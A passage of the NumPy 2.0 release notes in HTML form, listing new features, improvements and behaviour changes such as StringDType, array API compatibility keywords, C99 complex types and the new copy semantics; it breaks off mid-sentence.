<h3><code><span>ndarray.device</span></code> and <code><span>ndarray.to_device</span></code><a href="#ndarray-device-and-ndarray-to-device" title="Link to this heading">#</a></h3>
<p>An <code><span>ndarray.device</span></code> attribute and <code><span>ndarray.to_device</span></code> method were
added to <code><span>numpy.ndarray</span></code> for array API standard compatibility.</p>
<p>Additionally, <code><span>device</span></code> keyword-only arguments were added to:
<a href="https://numpy.org/devdocs/reference/generated/numpy.asarray.html#numpy.asarray" title="numpy.asarray"><code><span>asarray</span></code></a>, <a href="https://numpy.org/devdocs/reference/generated/numpy.arange.html#numpy.arange" title="numpy.arange"><code><span>arange</span></code></a>, <a href="https://numpy.org/devdocs/reference/generated/numpy.empty.html#numpy.empty" title="numpy.empty"><code><span>empty</span></code></a>, <a href="https://numpy.org/devdocs/reference/generated/numpy.empty_like.html#numpy.empty_like" title="numpy.empty_like"><code><span>empty_like</span></code></a>,
<a href="https://numpy.org/devdocs/reference/generated/numpy.eye.html#numpy.eye" title="numpy.eye"><code><span>eye</span></code></a>, <a href="https://numpy.org/devdocs/reference/generated/numpy.full.html#numpy.full" title="numpy.full"><code><span>full</span></code></a>, <a href="https://numpy.org/devdocs/reference/generated/numpy.full_like.html#numpy.full_like" title="numpy.full_like"><code><span>full_like</span></code></a>, <a href="https://numpy.org/devdocs/reference/generated/numpy.linspace.html#numpy.linspace" title="numpy.linspace"><code><span>linspace</span></code></a>,
<a href="https://numpy.org/devdocs/reference/generated/numpy.ones.html#numpy.ones" title="numpy.ones"><code><span>ones</span></code></a>, <a href="https://numpy.org/devdocs/reference/generated/numpy.ones_like.html#numpy.ones_like" title="numpy.ones_like"><code><span>ones_like</span></code></a>, <a href="https://numpy.org/devdocs/reference/generated/numpy.zeros.html#numpy.zeros" title="numpy.zeros"><code><span>zeros</span></code></a>, and <a href="https://numpy.org/devdocs/reference/generated/numpy.zeros_like.html#numpy.zeros_like" title="numpy.zeros_like"><code><span>zeros_like</span></code></a>.</p>
<p>For all these new arguments, only <code><span>device="cpu"</span></code> is supported.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25233">gh-25233</a>)</p>
</section>
<section id="stringdtype-has-been-added-to-numpy">
<h3>StringDType has been added to NumPy<a href="#stringdtype-has-been-added-to-numpy" title="Link to this heading">#</a></h3>
<p>We have added a new variable-width UTF-8 encoded string data type, implementing
a “NumPy array of Python strings”, including support for a user-provided missing
data sentinel. It is intended as a drop-in replacement for arrays of Python
strings and missing data sentinels using the object dtype. See <a href="https://numpy.org/neps/nep-0055-string_dtype.html">NEP 55</a> and <a href="https://numpy.org/devdocs/user/basics.strings.html#stringdtype"><span>the
documentation</span></a> for more details.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25347">gh-25347</a>)</p>
</section>
<section id="new-keywords-for-cholesky-and-pinv">
<h3>New keywords for <code><span>cholesky</span></code> and <code><span>pinv</span></code><a href="#new-keywords-for-cholesky-and-pinv" title="Link to this heading">#</a></h3>
<p>The <code><span>upper</span></code> and <code><span>rtol</span></code> keywords were added to <a href="https://numpy.org/devdocs/reference/generated/numpy.linalg.cholesky.html#numpy.linalg.cholesky" title="numpy.linalg.cholesky"><code><span>numpy.linalg.cholesky</span></code></a> and
<a href="https://numpy.org/devdocs/reference/generated/numpy.linalg.pinv.html#numpy.linalg.pinv" title="numpy.linalg.pinv"><code><span>numpy.linalg.pinv</span></code></a>, respectively, to improve array API standard compatibility.</p>
<p>For <a href="https://numpy.org/devdocs/reference/generated/numpy.linalg.pinv.html#numpy.linalg.pinv" title="numpy.linalg.pinv"><code><span>pinv</span></code></a>, if neither <code><span>rcond</span></code> nor <code><span>rtol</span></code> is specified,
the <code><span>rcond</span></code>’s default is used. We plan to deprecate and remove <code><span>rcond</span></code> in
the future.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25388">gh-25388</a>)</p>
</section>
<section id="new-keywords-for-sort-argsort-and-linalg-matrix-rank">
<h3>New keywords for <code><span>sort</span></code>, <code><span>argsort</span></code> and <code><span>linalg.matrix_rank</span></code><a href="#new-keywords-for-sort-argsort-and-linalg-matrix-rank" title="Link to this heading">#</a></h3>
<p>New keyword parameters were added to improve array API standard compatibility:</p>
<ul>
<li><p><code><span>rtol</span></code> was added to <a href="https://numpy.org/devdocs/reference/generated/numpy.linalg.matrix_rank.html#numpy.linalg.matrix_rank" title="numpy.linalg.matrix_rank"><code><span>matrix_rank</span></code></a>.</p></li>
<li><p><code><span>stable</span></code> was added to <a href="https://numpy.org/devdocs/reference/generated/numpy.sort.html#numpy.sort" title="numpy.sort"><code><span>sort</span></code></a> and <a href="https://numpy.org/devdocs/reference/generated/numpy.argsort.html#numpy.argsort" title="numpy.argsort"><code><span>argsort</span></code></a>.</p></li>
</ul>
<p>(<a href="https://github.com/numpy/numpy/pull/25437">gh-25437</a>)</p>
</section>
<section id="new-numpy-strings-namespace-for-string-ufuncs">
<h3>New <code><span>numpy.strings</span></code> namespace for string ufuncs<a href="#new-numpy-strings-namespace-for-string-ufuncs" title="Link to this heading">#</a></h3>
<p>NumPy now implements some string operations as ufuncs. The old <code><span>np.char</span></code>
namespace is still available, and where possible the string manipulation
functions in that namespace have been updated to use the new ufuncs,
substantially improving their performance.</p>
<p>Where possible, we suggest updating code to use functions in <code><span>np.strings</span></code>
instead of <code><span>np.char</span></code>. In the future we may deprecate <code><span>np.char</span></code> in favor of
<code><span>np.strings</span></code>.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25463">gh-25463</a>)</p>
</section>
<section id="numpy-fft-support-for-different-precisions-and-in-place-calculations">
<h3><a href="https://numpy.org/devdocs/reference/routines.fft.html#module-numpy.fft" title="numpy.fft"><code><span>numpy.fft</span></code></a> support for different precisions and in-place calculations<a href="#numpy-fft-support-for-different-precisions-and-in-place-calculations" title="Link to this heading">#</a></h3>
<p>The various FFT routines in <a href="https://numpy.org/devdocs/reference/routines.fft.html#module-numpy.fft" title="numpy.fft"><code><span>numpy.fft</span></code></a> now do their calculations natively in
float, double, or long double precision, depending on the input precision,
instead of always calculating in double precision. Hence, the calculation will
now be less precise for single and more precise for long double precision.
The data type of the output array will now be adjusted accordingly.</p>
<p>Furthermore, all FFT routines have gained an <code><span>out</span></code> argument that can be used
for in-place calculations.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25536">gh-25536</a>)</p>
</section>
<section id="configtool-and-pkg-config-support">
<h3>configtool and pkg-config support<a href="#configtool-and-pkg-config-support" title="Link to this heading">#</a></h3>
<p>A new <code><span>numpy-config</span></code> CLI script is available that can be queried for the
NumPy version and for compile flags needed to use the NumPy C API. This will
allow build systems to better support the use of NumPy as a dependency.
Also, a <code><span>numpy.pc</span></code> pkg-config file is now included with Numpy. In order to
find its location for use with <code><span>PKG_CONFIG_PATH</span></code>, use
<code><span>numpy-config</span> <span>--pkgconfigdir</span></code>.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25730">gh-25730</a>)</p>
</section>
<section id="array-api-standard-support-in-the-main-namespace">
<h3>Array API standard support in the main namespace<a href="#array-api-standard-support-in-the-main-namespace" title="Link to this heading">#</a></h3>
<p>The main <code><span>numpy</span></code> namespace now supports the array API standard. See
<a href="https://numpy.org/devdocs/reference/array_api.html#array-api-standard-compatibility"><span>Array API standard compatibility</span></a> for details.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25911">gh-25911</a>)</p>
</section>
</section>
<section id="improvements">
<h2>Improvements<a href="#improvements" title="Link to this heading">#</a></h2>
<ul>
<li><p>Strings are now supported by <code><span>any</span></code>, <code><span>all</span></code>, and the logical ufuncs.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25651">gh-25651</a>)</p>
</li>
</ul>
<section id="integer-sequences-as-the-shape-argument-for-memmap">
<h3>Integer sequences as the shape argument for <code><span>memmap</span></code><a href="#integer-sequences-as-the-shape-argument-for-memmap" title="Link to this heading">#</a></h3>
<p><a href="https://numpy.org/devdocs/reference/generated/numpy.memmap.html#numpy.memmap" title="numpy.memmap"><code><span>numpy.memmap</span></code></a> can now be created with any integer sequence as the <code><span>shape</span></code>
argument, such as a list or numpy array of integers. Previously, only the
types of tuple and int could be used without raising an error.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/23729">gh-23729</a>)</p>
</section>
<section id="errstate-is-now-faster-and-context-safe">
<h3><code><span>errstate</span></code> is now faster and context safe<a href="#errstate-is-now-faster-and-context-safe" title="Link to this heading">#</a></h3>
<p>The <a href="https://numpy.org/devdocs/reference/generated/numpy.errstate.html#numpy.errstate" title="numpy.errstate"><code><span>numpy.errstate</span></code></a> context manager/decorator is now faster and
safer.  Previously, it was not context safe and had (rare)
issues with thread-safety.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/23936">gh-23936</a>)</p>
</section>
<section id="aarch64-quicksort-speed-improved-by-using-highway-s-vqsort">
<h3>AArch64 quicksort speed improved by using Highway’s VQSort<a href="#aarch64-quicksort-speed-improved-by-using-highway-s-vqsort" title="Link to this heading">#</a></h3>
<p>The first introduction of the Google Highway library, using VQSort on AArch64.
Execution time is improved by up to 16x in some cases, see the PR for benchmark
results. Extensions to other platforms will be done in the future.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/24018">gh-24018</a>)</p>
</section>
<section id="complex-types-underlying-c-type-changes">
<h3>Complex types - underlying C type changes<a href="#complex-types-underlying-c-type-changes" title="Link to this heading">#</a></h3>
<ul>
<li><p>The underlying C types for all of NumPy’s complex types have been changed to
use C99 complex types.</p></li>
<li><p>While this change does not affect the memory layout of complex types, it
changes the API to be used to directly retrieve or write the real or
complex part of the complex number, since direct field access (as in <code><span>c.real</span></code>
or <code><span>c.imag</span></code>) is no longer an option. You can now use utilities provided in
<code><span>numpy/npy_math.h</span></code> to do these operations, like this:</p>
<div><pre><span></span><span>npy_cdouble</span><span> </span><span>c</span><span>;</span>
<span>npy_csetreal</span><span>(</span><span>&amp;</span><span>c</span><span>,</span><span> </span><span>1.0</span><span>);</span>
<span>npy_csetimag</span><span>(</span><span>&amp;</span><span>c</span><span>,</span><span> </span><span>0.0</span><span>);</span>
<span>printf</span><span>(</span><span>"%d + %di</span><span>\n</span><span>"</span><span>,</span><span> </span><span>npy_creal</span><span>(</span><span>c</span><span>),</span><span> </span><span>npy_cimag</span><span>(</span><span>c</span><span>));</span>
</pre></div>
</li>
<li><p>To ease cross-version compatibility, equivalent macros and a compatibility
layer have been added which can be used by downstream packages to continue
to support both NumPy 1.x and 2.x. See <a href="https://numpy.org/devdocs/reference/c-api/coremath.html#complex-numbers"><span>Support for complex numbers</span></a> for more info.</p></li>
<li><p><code><span>numpy/npy_common.h</span></code> now includes <code><span>complex.h</span></code>, which means that <code><span>complex</span></code>
is now a reserved keyword.</p></li>
</ul>
<p>(<a href="https://github.com/numpy/numpy/pull/24085">gh-24085</a>)</p>
</section>
<section id="iso-c-binding-support-and-improved-common-blocks-for-f2py">
<h3><code><span>iso_c_binding</span></code> support and improved common blocks for <code><span>f2py</span></code><a href="#iso-c-binding-support-and-improved-common-blocks-for-f2py" title="Link to this heading">#</a></h3>
<p>Previously, users would have to define their own custom <code><span>f2cmap</span></code> file to use
type mappings defined by the Fortran2003 <code><span>iso_c_binding</span></code> intrinsic module.
These type maps are now natively supported by <code><span>f2py</span></code></p>
<p>(<a href="https://github.com/numpy/numpy/pull/24555">gh-24555</a>)</p>
<p><code><span>f2py</span></code> now handles <code><span>common</span></code> blocks which have <code><span>kind</span></code> specifications from
modules. This further expands the usability of intrinsics like
<code><span>iso_fortran_env</span></code> and <code><span>iso_c_binding</span></code>.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25186">gh-25186</a>)</p>
</section>
<section id="call-str-automatically-on-third-argument-to-functions-like-assert-equal">
<h3>Call <code><span>str</span></code> automatically on third argument to functions like <code><span>assert_equal</span></code><a href="#call-str-automatically-on-third-argument-to-functions-like-assert-equal" title="Link to this heading">#</a></h3>
<p>The third argument to functions like <a href="https://numpy.org/devdocs/reference/generated/numpy.testing.assert_equal.html#numpy.testing.assert_equal" title="numpy.testing.assert_equal"><code><span>assert_equal</span></code></a> now has
<code><span>str</span></code> called on it automatically. This way it mimics the built-in <code><span>assert</span></code>
statement, where <code><span>assert_equal(a,</span> <span>b,</span> <span>obj)</span></code> works like <code><span>assert</span> <span>a</span> <span>==</span> <span>b,</span> <span>obj</span></code>.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/24877">gh-24877</a>)</p>
</section>
<section id="support-for-array-like-atol-rtol-in-isclose-allclose">
<h3>Support for array-like <code><span>atol</span></code>/<code><span>rtol</span></code> in <code><span>isclose</span></code>, <code><span>allclose</span></code><a href="#support-for-array-like-atol-rtol-in-isclose-allclose" title="Link to this heading">#</a></h3>
<p>The keywords <code><span>atol</span></code> and <code><span>rtol</span></code> in <a href="https://numpy.org/devdocs/reference/generated/numpy.isclose.html#numpy.isclose" title="numpy.isclose"><code><span>isclose</span></code></a> and <a href="https://numpy.org/devdocs/reference/generated/numpy.allclose.html#numpy.allclose" title="numpy.allclose"><code><span>allclose</span></code></a>
now accept both scalars and arrays. An array, if given, must broadcast
to the shapes of the first two array arguments.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/24878">gh-24878</a>)</p>
</section>
<section id="consistent-failure-messages-in-test-functions">
<h3>Consistent failure messages in test functions<a href="#consistent-failure-messages-in-test-functions" title="Link to this heading">#</a></h3>
<p>Previously, some <a href="https://numpy.org/devdocs/reference/routines.testing.html#module-numpy.testing" title="numpy.testing"><code><span>numpy.testing</span></code></a> assertions printed messages that
referred to the actual and desired results as <code><span>x</span></code> and <code><span>y</span></code>.
Now, these values are consistently referred to as <code><span>ACTUAL</span></code> and
<code><span>DESIRED</span></code>.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/24931">gh-24931</a>)</p>
</section>
<section id="n-d-fft-transforms-allow-s-i-1">
<h3>n-D FFT transforms allow <code><span>s[i]</span> <span>==</span> <span>-1</span></code><a href="#n-d-fft-transforms-allow-s-i-1" title="Link to this heading">#</a></h3>
<p>The <a href="https://numpy.org/devdocs/reference/generated/numpy.fft.fftn.html#numpy.fft.fftn" title="numpy.fft.fftn"><code><span>fftn</span></code></a>, <a href="https://numpy.org/devdocs/reference/generated/numpy.fft.ifftn.html#numpy.fft.ifftn" title="numpy.fft.ifftn"><code><span>ifftn</span></code></a>, <a href="https://numpy.org/devdocs/reference/generated/numpy.fft.rfftn.html#numpy.fft.rfftn" title="numpy.fft.rfftn"><code><span>rfftn</span></code></a>,
<a href="https://numpy.org/devdocs/reference/generated/numpy.fft.irfftn.html#numpy.fft.irfftn" title="numpy.fft.irfftn"><code><span>irfftn</span></code></a>, <a href="https://numpy.org/devdocs/reference/generated/numpy.fft.fft2.html#numpy.fft.fft2" title="numpy.fft.fft2"><code><span>fft2</span></code></a>, <a href="https://numpy.org/devdocs/reference/generated/numpy.fft.ifft2.html#numpy.fft.ifft2" title="numpy.fft.ifft2"><code><span>ifft2</span></code></a>, <a href="https://numpy.org/devdocs/reference/generated/numpy.fft.rfft2.html#numpy.fft.rfft2" title="numpy.fft.rfft2"><code><span>rfft2</span></code></a>
and <a href="https://numpy.org/devdocs/reference/generated/numpy.fft.irfft2.html#numpy.fft.irfft2" title="numpy.fft.irfft2"><code><span>irfft2</span></code></a> functions now use the whole input array along the axis
<code><span>i</span></code> if <code><span>s[i]</span> <span>==</span> <span>-1</span></code>, in line with the array API standard.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25495">gh-25495</a>)</p>
</section>
<section id="guard-pyarrayscalar-val-and-pyunicodescalarobject-for-the-limited-api">
<h3>Guard PyArrayScalar_VAL and PyUnicodeScalarObject for the limited API<a href="#guard-pyarrayscalar-val-and-pyunicodescalarobject-for-the-limited-api" title="Link to this heading">#</a></h3>
<p><code><span>PyUnicodeScalarObject</span></code> holds a <code><span>PyUnicodeObject</span></code>, which is not available
when using <code><span>Py_LIMITED_API</span></code>. Add guards to hide it and consequently also make
the <code><span>PyArrayScalar_VAL</span></code> macro hidden.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25531">gh-25531</a>)</p>
</section>
</section>
<section id="changes">
<h2>Changes<a href="#changes" title="Link to this heading">#</a></h2>
<ul>
<li><p><code><span>np.gradient()</span></code> now returns a tuple rather than a list making the
return value immutable.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/23861">gh-23861</a>)</p>
</li>
<li><p>Being fully context and thread-safe, <code><span>np.errstate</span></code> can only
be entered once now.</p></li>
<li><p><code><span>np.setbufsize</span></code> is now tied to <code><span>np.errstate()</span></code>: leaving an
<code><span>np.errstate</span></code> context will also reset the <code><span>bufsize</span></code>.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/23936">gh-23936</a>)</p>
</li>
<li><p>A new public <code><span>np.lib.array_utils</span></code> submodule has been introduced and it
currently contains three functions: <code><span>byte_bounds</span></code> (moved from
<code><span>np.lib.utils</span></code>), <code><span>normalize_axis_tuple</span></code> and <code><span>normalize_axis_index</span></code>.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/24540">gh-24540</a>)</p>
</li>
<li><p>Introduce <a href="https://numpy.org/devdocs/reference/arrays.scalars.html#numpy.bool" title="numpy.bool"><code><span>numpy.bool</span></code></a> as the new canonical name for NumPy’s boolean dtype,
and make <a href="https://numpy.org/devdocs/reference/arrays.scalars.html#numpy.bool_" title="numpy.bool_"><code><span>numpy.bool_</span></code></a> an alias to it. Note that until NumPy 1.24,
<code><span>np.bool</span></code> was an alias to Python’s builtin <code><span>bool</span></code>. The new name helps
with array API standard compatibility and is a more intuitive name.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25080">gh-25080</a>)</p>
</li>
<li><p>The <code><span>dtype.flags</span></code> value was previously stored as a signed integer.
This means that the aligned dtype struct flag lead to negative flags being
set (-128 rather than 128). This flag is now stored unsigned (positive). Code
which checks flags manually may need to adapt.  This may include code
compiled with Cython 0.29.x.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25816">gh-25816</a>)</p>
</li>
</ul>
<section id="representation-of-numpy-scalars-changed">
<h3>Representation of NumPy scalars changed<a href="#representation-of-numpy-scalars-changed" title="Link to this heading">#</a></h3>
<p>As per <a href="https://numpy.org/neps/nep-0051-scalar-representation.html#nep51" title="(in NumPy Enhancement Proposals)"><span>NEP 51</span></a>, the scalar representation has been
updated to include the type information to avoid confusion with
Python scalars.</p>
<p>Scalars are now printed as <code><span>np.float64(3.0)</span></code> rather than just <code><span>3.0</span></code>.
This may disrupt workflows that store representations of numbers
(e.g., to files) making it harder to read them. They should be stored as
explicit strings, for example by using <code><span>str()</span></code> or <code><span>f"{scalar!s}"</span></code>.
For the time being, affected users can use <code><span>np.set_printoptions(legacy="1.25")</span></code>
to get the old behavior (with possibly a few exceptions).
Documentation of downstream projects may require larger updates,
if code snippets are tested.  We are working on tooling for
<a href="https://github.com/scientific-python/pytest-doctestplus/issues/107">doctest-plus</a>
to facilitate updates.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/22449">gh-22449</a>)</p>
</section>
<section id="truthiness-of-numpy-strings-changed">
<h3>Truthiness of NumPy strings changed<a href="#truthiness-of-numpy-strings-changed" title="Link to this heading">#</a></h3>
<p>NumPy strings previously were inconsistent about how they defined
if the string is <code><span>True</span></code> or <code><span>False</span></code> and the definition did not
match the one used by Python.
Strings are now considered <code><span>True</span></code> when they are non-empty and
<code><span>False</span></code> when they are empty.
This changes the following distinct cases:</p>
<ul>
<li><p>Casts from string to boolean were previously roughly equivalent
to <code><span>string_array.astype(np.int64).astype(bool)</span></code>, meaning that only
valid integers could be cast.
Now a string of <code><span>"0"</span></code> will be considered <code><span>True</span></code> since it is not empty.
If you need the old behavior, you may use the above step (casting
to integer first) or <code><span>string_array</span> <span>==</span> <span>"0"</span></code> (if the input is only ever <code><span>0</span></code> or <code><span>1</span></code>).
To get the new result on old NumPy versions use <code><span>string_array</span> <span>!=</span> <span>""</span></code>.</p></li>
<li><p><code><span>np.nonzero(string_array)</span></code> previously ignored whitespace so that
a string only containing whitespace was considered <code><span>False</span></code>.
Whitespace is now considered <code><span>True</span></code>.</p></li>
</ul>
<p>This change does not affect <code><span>np.loadtxt</span></code>, <code><span>np.fromstring</span></code>, or <code><span>np.genfromtxt</span></code>.
The first two still use the integer definition, while <code><span>genfromtxt</span></code> continues to
match for <code><span>"true"</span></code> (ignoring case).
However, if <code><span>np.bool_</span></code> is used as a converter the result will change.</p>
<p>The change does affect <code><span>np.fromregex</span></code> as it uses direct assignments.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/23871">gh-23871</a>)</p>
</section>
<section id="a-mean-keyword-was-added-to-var-and-std-function">
<h3>A <code><span>mean</span></code> keyword was added to var and std function<a href="#a-mean-keyword-was-added-to-var-and-std-function" title="Link to this heading">#</a></h3>
<p>Often when the standard deviation is needed the mean is also needed. The same
holds for the variance and the mean. Until now the mean is then calculated twice,
the change introduced here for the <a href="https://numpy.org/devdocs/reference/generated/numpy.var.html#numpy.var" title="numpy.var"><code><span>var</span></code></a> and <a href="https://numpy.org/devdocs/reference/generated/numpy.std.html#numpy.std" title="numpy.std"><code><span>std</span></code></a> functions
allows for passing in a precalculated mean as an keyword argument. See the
docstrings for details and an example illustrating the speed-up.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/24126">gh-24126</a>)</p>
</section>
<section id="remove-datetime64-deprecation-warning-when-constructing-with-timezone">
<h3>Remove datetime64 deprecation warning when constructing with timezone<a href="#remove-datetime64-deprecation-warning-when-constructing-with-timezone" title="Link to this heading">#</a></h3>
<p>The <a href="https://numpy.org/devdocs/reference/arrays.scalars.html#numpy.datetime64" title="numpy.datetime64"><code><span>numpy.datetime64</span></code></a> method now issues a UserWarning rather than a
DeprecationWarning whenever a timezone is included in the datetime
string that is provided.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/24193">gh-24193</a>)</p>
</section>
<section id="default-integer-dtype-is-now-64-bit-on-64-bit-windows">
<h3>Default integer dtype is now 64-bit on 64-bit Windows<a href="#default-integer-dtype-is-now-64-bit-on-64-bit-windows" title="Link to this heading">#</a></h3>
<p>The default NumPy integer is now 64-bit on all 64-bit systems as the historic
32-bit default on Windows was a common source of issues. Most users should not
notice this. The main issues may occur with code interfacing with libraries
written in a compiled language like C.  For more information see
<a href="https://numpy.org/devdocs/numpy_2_0_migration_guide.html#migration-windows-int64"><span>Windows default integer</span></a>.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/24224">gh-24224</a>)</p>
</section>
<section id="renamed-numpy-core-to-numpy-core">
<h3>Renamed <code><span>numpy.core</span></code> to <code><span>numpy._core</span></code><a href="#renamed-numpy-core-to-numpy-core" title="Link to this heading">#</a></h3>
<p>Accessing <code><span>numpy.core</span></code> now emits a DeprecationWarning. In practice
we have found that most downstream usage of <code><span>numpy.core</span></code> was to access
functionality that is available in the main <code><span>numpy</span></code> namespace.
If for some reason you are using functionality in <code><span>numpy.core</span></code> that
is not available in the main <code><span>numpy</span></code> namespace, this means you are likely
using private NumPy internals. You can still access these internals via
<code><span>numpy._core</span></code> without a deprecation warning but we do not provide any
backward compatibility guarantees for NumPy internals. Please open an issue
if you think a mistake was made and something needs to be made public.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/24634">gh-24634</a>)</p>
<p>The “relaxed strides” debug build option, which was previously enabled through
the <code><span>NPY_RELAXED_STRIDES_DEBUG</span></code> environment variable or the
<code><span>-Drelaxed-strides-debug</span></code> config-settings flag has been removed.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/24717">gh-24717</a>)</p>
</section>
<section id="redefinition-of-np-intp-np-uintp-almost-never-a-change">
<h3>Redefinition of <code><span>np.intp</span></code>/<code><span>np.uintp</span></code> (almost never a change)<a href="#redefinition-of-np-intp-np-uintp-almost-never-a-change" title="Link to this heading">#</a></h3>
<p>Due to the actual use of these types almost always matching the use of
<code><span>size_t</span></code>/<code><span>Py_ssize_t</span></code> this is now the definition in C.
Previously, it matched <code><span>intptr_t</span></code> and <code><span>uintptr_t</span></code> which would often
have been subtly incorrect.
This has no effect on the vast majority of machines since the size
of these types only differ on extremely niche platforms.</p>
<p>However, it means that:</p>
<ul>
<li><p>Pointers may not necessarily fit into an <code><span>intp</span></code> typed array anymore.
The <code><span>p</span></code> and <code><span>P</span></code> character codes can still be used, however.</p></li>
<li><p>Creating <code><span>intptr_t</span></code> or <code><span>uintptr_t</span></code> typed arrays in C remains possible
in a cross-platform way via <code><span>PyArray_DescrFromType('p')</span></code>.</p></li>
<li><p>The new character codes <code><span>nN</span></code> were introduced.</p></li>
<li><p>It is now correct to use the Python C-API functions when parsing
to <code><span>npy_intp</span></code> typed arguments.</p></li>
</ul>
<p>(<a href="https://github.com/numpy/numpy/pull/24888">gh-24888</a>)</p>
</section>
<section id="numpy-fft-helper-made-private">
<h3><code><span>numpy.fft.helper</span></code> made private<a href="#numpy-fft-helper-made-private" title="Link to this heading">#</a></h3>
<p><code><span>numpy.fft.helper</span></code> was renamed to <code><span>numpy.fft._helper</span></code> to indicate
that it is a private submodule. All public functions exported by it
should be accessed from <a href="https://numpy.org/devdocs/reference/routines.fft.html#module-numpy.fft" title="numpy.fft"><code><span>numpy.fft</span></code></a>.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/24945">gh-24945</a>)</p>
</section>
<section id="numpy-linalg-linalg-made-private">
<h3><code><span>numpy.linalg.linalg</span></code> made private<a href="#numpy-linalg-linalg-made-private" title="Link to this heading">#</a></h3>
<p><code><span>numpy.linalg.linalg</span></code> was renamed to <code><span>numpy.linalg._linalg</span></code>
to indicate that it is a private submodule. All public functions
exported by it should be accessed from <a href="https://numpy.org/devdocs/reference/routines.linalg.html#module-numpy.linalg" title="numpy.linalg"><code><span>numpy.linalg</span></code></a>.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/24946">gh-24946</a>)</p>
</section>
<section id="out-of-bound-axis-not-the-same-as-axis-none">
<h3>Out-of-bound axis not the same as <code><span>axis=None</span></code><a href="#out-of-bound-axis-not-the-same-as-axis-none" title="Link to this heading">#</a></h3>
<p>In some cases <code><span>axis=32</span></code> or for concatenate any large value
was the same as <code><span>axis=None</span></code>.
Except for <code><span>concatenate</span></code> this was deprecate.
Any out of bound axis value will now error, make sure to use
<code><span>axis=None</span></code>.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25149">gh-25149</a>)</p>
</section>
<section id="new-copy-keyword-meaning-for-array-and-asarray-constructors">
<span id="copy-keyword-changes-2-0"></span><h3>New <code><span>copy</span></code> keyword meaning for <code><span>array</span></code> and <code><span>asarray</span></code> constructors<a href="#new-copy-keyword-meaning-for-array-and-asarray-constructors" title="Link to this heading">#</a></h3>
<p>Now <a href="https://numpy.org/devdocs/reference/generated/numpy.array.html#numpy.array" title="numpy.array"><code><span>numpy.array</span></code></a> and <a href="https://numpy.org/devdocs/reference/generated/numpy.asarray.html#numpy.asarray" title="numpy.asarray"><code><span>numpy.asarray</span></code></a> support three values for <code><span>copy</span></code> parameter:</p>
<ul>
<li><p><code><span>None</span></code> - A copy will only be made if it is necessary.</p></li>
<li><p><code><span>True</span></code> - Always make a copy.</p></li>
<li><p><code><span>False</span></code> - Never make a copy. If a copy is required a <code><span>ValueError</span></code> is raised.</p></li>
</ul>
<p>The meaning of <code><span>False</span></code> changed as it now raises an exception if a copy is needed.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25168">gh-25168</a>)</p>
</section>
<section id="the-array-special-method-now-takes-a-copy-keyword-argument">
<h3>The <code><span>__array__</span></code> special method now takes a <code><span>copy</span></code> keyword argument.<a href="#the-array-special-method-now-takes-a-copy-keyword-argument" title="Link to this heading">#</a></h3>
<p>NumPy will pass <code><span>copy</span></code> to the <code><span>__array__</span></code> special method in situations where
it would be set to a non-default value (e.g. in a call to
<code><span>np.asarray(some_object,</span> <span>copy=False)</span></code>). Currently, if an
unexpected keyword argument error is raised after this, NumPy will print a
warning and re-try without the <code><span>copy</span></code> keyword argument. Implementations of
objects implementing the <code><span>__array__</span></code> protocol should accept a <code><span>copy</span></code> keyword
argument with the same meaning as when passed to <a href="https://numpy.org/devdocs/reference/generated/numpy.array.html#numpy.array" title="numpy.array"><code><span>numpy.array</span></code></a> or
<a href="https://numpy.org/devdocs/reference/generated/numpy.asarray.html#numpy.asarray" title="numpy.asarray"><code><span>numpy.asarray</span></code></a>.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25168">gh-25168</a>)</p>
</section>
<section id="cleanup-of-initialization-of-numpy-dtype-with-strings-with-commas">
<h3>Cleanup of initialization of <code><span>numpy.dtype</span></code> with strings with commas<a href="#cleanup-of-initialization-of-numpy-dtype-with-strings-with-commas" title="Link to this heading">#</a></h3>
<p>The interpretation of strings with commas is changed slightly, in that a
trailing comma will now always create a structured dtype.  E.g., where
previously <code><span>np.dtype("i")</span></code> and <code><span>np.dtype("i,")</span></code> were treated as identical,
now <code><span>np.dtype("i,")</span></code> will create a structured dtype, with a single
field. This is analogous to <code><span>np.dtype("i,i")</span></code> creating a structured dtype
with two fields, and makes the behaviour consistent with that expected of
tuples.</p>
<p>At the same time, the use of single number surrounded by parenthesis to
indicate a sub-array shape, like in <code><span>np.dtype("(2)i,")</span></code>, is deprecated.
Instead; one should use <code><span>np.dtype("(2,)i")</span></code> or <code><span>np.dtype("2i")</span></code>.
Eventually, using a number in parentheses will raise an exception, like is the
case for initializations without a comma, like <code><span>np.dtype("(2)i")</span></code>.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25434">gh-25434</a>)</p>
</section>
<section id="change-in-how-complex-sign-is-calculated">
<h3>Change in how complex sign is calculated<a href="#change-in-how-complex-sign-is-calculated" title="Link to this heading">#</a></h3>
<p>Following the array API standard, the complex sign is now calculated as
